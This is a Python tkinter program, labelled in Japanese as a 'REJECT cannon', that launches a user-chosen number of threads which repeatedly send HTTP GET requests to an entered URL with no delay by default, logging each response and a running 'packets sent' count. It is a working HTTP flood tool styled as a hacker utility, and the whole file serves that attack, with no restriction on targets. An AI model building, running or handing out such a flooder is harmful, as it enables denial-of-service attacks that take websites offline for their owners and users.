import tkinter as tk
import requests
import threading
import time
from tkinter import messagebox

# グローバル変数
is_running = False
log_counter = 1
url = ""
sent_packets = 0

# リクエスト開始
def start_requests():
    global is_running
    global log_counter
    global url
    global sent_packets

    if is_running:
        messagebox.showerror("エラー", "リクエストは既に開始されています")
        return

    url = url_entry.get()
    if not url:
        messagebox.showerror("エラー", "URLが入力されていません")
        return

    timeout = timeout_entry.get()
    if timeout:
        try:
            timeout = int(timeout)
        except ValueError:
            messagebox.showerror("エラー", "タイムアウトには数値を入力してください")
            return
    else:
        timeout = None

    interval = interval_entry.get()
    if interval:
        try:
            interval = int(interval)
        except ValueError:
            messagebox.showerror("エラー", "インターバルには数値を入力してください")
            return
    else:
        interval = 0

    num_threads = num_threads_entry.get()
    if num_threads:
        try:
            num_threads = int(num_threads)
        except ValueError:
            messagebox.showerror("エラー", "スレッド数には数値を入力してください")
            return
    else:
        num_threads = 1

    is_running = True
    log_counter = 1
    sent_packets = 0

    log_textbox.config(state=tk.NORMAL)
    log_textbox.delete("1.0", tk.END)

    for _ in range(num_threads):
        threading.Thread(target=execute_requests, args=(url, timeout, interval)).start()

# リクエスト停止
def stop_requests():
    global is_running
    is_running = False
    show_log("リクエストの送信を停止しました", "info")

# 終了ボタン
def quit_application():
    root.destroy()

# ログ表示
def show_log(message, level="info"):
    global log_counter

    tag = f"log{log_counter}"
    color = "#00FF00"  # ハッカーっぽい緑色

    log_textbox.config(state=tk.NORMAL)
    log_textbox.insert(tk.END, f"{message}\n", (tag, color))
    log_textbox.see(tk.END)
    log_counter += 1
    log_textbox.config(state=tk.DISABLED)

# リクエスト実行
def execute_requests(url, timeout, interval):
    global is_running
    global sent_packets

    while is_running:
        try:
            response = requests.get(url, timeout=timeout)
            status_code = response.status_code
            sent_packets += 1
            # 現在時を取得してログに追加
            current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
            show_log(f"[{current_time}] ステータスコード: {status_code}, 送信済みパケット数: {sent_packets}", "info")
        except requests.exceptions.RequestException as ex:
            error_code = getattr(ex, "code", None)
            show_log(f"リクエストエラーが発生しました: {ex}, エラーコード: {error_code}", "error")
        except Exception as ex:
            show_log(f"予期せぬエラーが発生しました: {ex}", "error")

        time.sleep(interval / 1000)

# GUIウィンドウの作成
root = tk.Tk()
root.title("REJECT砲 GUI版")
root.geometry("400x600")

# フォント設定
font_family = "Courier New"
font_size = 12

# バックグラウンド設定
bg_color = "#000000"  # ブラック

# フォントカラー設定
fg_color = "#00FF00"  # ハッカーっぽい緑色

# ウィンドウの背景色を設定
root.configure(bg=bg_color)

# URL入力用エントリーボックス
url_label = tk.Label(root, text="URL:", bg=bg_color, fg=fg_color, font=(font_family, font_size))
url_label.pack(pady=5)
url_entry = tk.Entry(root, font=(font_family, font_size))
url_entry.pack()

# タイムアウト入力用エントリーボックス
timeout_label = tk.Label(root, text="タイムアウト(ms):", bg=bg_color, fg=fg_color, font=(font_family, font_size))
timeout_label.pack(pady=5)
timeout_entry = tk.Entry(root, font=(font_family, font_size))
timeout_entry.pack()

# インターバル入力用エントリーボックス
interval_label = tk.Label(root, text="インターバル(ms):", bg=bg_color, fg=fg_color, font=(font_family, font_size))
interval_label.pack(pady=5)
interval_entry = tk.Entry(root, font=(font_family, font_size))
interval_entry.pack()

# スレッド数入力用エントリーボックス
num_threads_label = tk.Label(root, text="スレッド数:", bg=bg_color, fg=fg_color, font=(font_family, font_size))
num_threads_label.pack(pady=5)
num_threads_entry = tk.Entry(root, font=(font_family, font_size))
num_threads_entry.pack()

# 開始ボタン
start_button = tk.Button(root, text="開始", command=start_requests, bg=bg_color, fg=fg_color, font=(font_family, font_size))
start_button.pack(pady=10)

# 停止ボタン
stop_button = tk.Button(root, text="停止", command=stop_requests, bg=bg_color, fg=fg_color, font=(font_family, font_size))
stop_button.pack(pady=10)

# 終了ボタン
quit_button = tk.Button(root, text="終了", command=quit_application, bg=bg_color, fg=fg_color, font=(font_family, font_size))
quit_button.pack(pady=10)

# ログ表示用テキストボックス
log_textbox = tk.Text(root, font=(font_family, font_size), bg=bg_color, fg=fg_color)
log_textbox.pack(padx=10, pady=10, fill=tk.BOTH, expand=True)
log_textbox.tag_config("log", foreground=fg_color)

# スクロールバーの追加
scrollbar = tk.Scrollbar(log_textbox)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
log_textbox.config(yscrollcommand=scrollbar.set)
scrollbar.config(command=log_textbox.yview)

root.mainloop()
